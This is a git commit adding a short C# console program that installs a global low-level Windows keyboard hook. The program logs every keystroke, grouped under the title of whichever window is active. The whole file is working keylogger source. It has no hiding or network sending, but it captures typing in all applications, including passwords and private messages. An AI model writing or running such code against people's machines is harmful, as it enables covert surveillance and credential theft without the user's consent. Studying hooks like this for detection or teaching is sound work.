c9c9694e3a47644797852dc77ab892be648e9855
l4km47 <manojlakmal999@gmail.com>
2017-07-13 23:24:11 +0530

    Initial commit

---
+++ logger/Program.cs
@@ -0,0 +1,99 @@
+﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
+
+namespace logger
+{
+    internal static class Program
+    {
+        private static string active = null;
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        private static string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            IntPtr handle = IntPtr.Zero;
+            StringBuilder Buff = new StringBuilder(nChars);
+            handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
+        }
+        private delegate IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static KeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        static void Main()
+        {
+            Hook();
+            Application.Run();
+            UnHook();
+        }
+
+        public static void Hook()
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        public static void UnHook()
+        {
+            UnhookWindowsHookEx(_hookID);
+        }
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int KeyCode = Marshal.ReadInt32(lParam);
+                if (!string.IsNullOrEmpty(active) && active != GetActiveWindowTitle())
+                {
+                    active = GetActiveWindowTitle();
+                    Console.WriteLine();
+                    Console.WriteLine();
+                    Console.WriteLine(active);
+                    Console.Write((Keys)KeyCode);
+                }
+                else if (string.IsNullOrEmpty(active))
+                {
+                    active = GetActiveWindowTitle();
+                    Console.WriteLine(active);
+                    Console.Write((Keys)KeyCode);
+                }
+                else
+                {
+                    Console.Write((Keys)KeyCode);
+                }
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+    }
+}
